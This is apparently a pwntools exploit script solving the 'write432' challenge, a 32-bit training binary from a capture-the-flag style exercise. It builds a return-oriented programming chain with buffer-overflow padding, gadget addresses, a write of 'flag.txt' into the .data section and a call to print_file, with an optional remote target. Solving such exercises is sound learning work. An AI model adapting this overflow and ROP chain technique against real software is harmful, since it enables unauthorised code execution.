#!/bin/python3
from pwn import *
import sys

binary = "./write432"
elf = context.binary = ELF(binary, False)
context.terminal = ["terminator", "-x", "bash", "-c"]
context.log_level  = 'debug'
libc = elf.libc
rop = ROP(elf)

script = '''

'''


def start(*args, **kwargs):
    usage = f"{sys.argv[0]} gdb \nor \n{sys.argv[0]} remote"
    # [ip, port]
    REMOTE = []
    if args:
        arguments = list(args)
        arguments.insert(0, elf.path)
        return process(arguments)

    if not args and not kwargs:
        if len(sys.argv) > 1:
            if sys.argv[1] == 'gdb':
                return gdb.debug(elf.path, gdbscript=script)
            elif sys.argv[1] == 'remote':
                return remote(REMOTE[0], REMOTE[1])
            else:
                print("INVALID ARGUMENT")
                print(usage)
                sys.exit(0)
        else:
            return process(elf.path)

def main():
    ### MAIN CODE HERE
    io = start()
    offset = 44
    usefulgadet = 0x08048543 # mov [edi], ebp ; ret
    pop_ebp = 0x0804839d
    addr = 0x804a018 #0x0804a01c #0x080485ab # memory address in .data section
    pop_edi_ebp = 0x080485aa

    payload = flat(
        cyclic(offset),
        pop_edi_ebp,
        addr,
        "flag.txt",
        usefulgadet,
        elf.sym['print_file'],
        p32(0x0),
        addr
    )
    io.recvuntil("> ")
    io.sendline(payload)
    io.interactive()


if __name__ == "__main__":
    main()
